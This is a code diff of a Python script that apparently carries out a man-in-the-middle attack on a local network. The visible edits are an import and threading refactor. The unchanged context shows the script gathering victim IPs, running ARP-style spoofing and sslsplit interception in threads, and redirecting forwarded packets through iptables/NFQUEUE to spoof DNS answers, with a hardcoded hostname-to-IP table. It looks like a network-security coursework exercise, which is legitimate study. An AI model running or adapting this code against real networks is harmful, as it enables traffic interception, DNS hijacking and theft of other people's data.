@@ -1,10 +1,10 @@
 #!./.env/bin/python
-import os
-from utils import get_victims, trick, sslsplit
 from netfilterqueue import NetfilterQueue
+from threading import Thread
+from time import sleep
 import scapy.all as scapy
-import threading
-import time
+from utils import get_victims, trick, sslsplit
+import os
 
 hostDict = {
     b'www.nycu.edu.tw.': '140.113.207.241',
@@ -34,7 +34,7 @@ def call_back(pkt: scapy.Packet):
 
 
 def dns_spoof():
-    time.sleep(1)
+    sleep(1)
     os.system(
         f'iptables -I FORWARD -j NFQUEUE --queue-num {QUEUE_NUM}')
     nfqueue.bind(QUEUE_NUM, call_back)
@@ -45,9 +45,9 @@ def main():
     ips = get_victims()
     os.system('iptables -F')
     threads = list()
-    threads.append(threading.Thread(target=trick, args=[ips]))
-    threads.append(threading.Thread(target=sslsplit))
-    threads.append(threading.Thread(target=dns_spoof))
+    threads.append(Thread(target=trick, args=[ips]))
+    threads.append(Thread(target=sslsplit))
+    threads.append(Thread(target=dns_spoof))
     for t in threads:
         t.start()
 
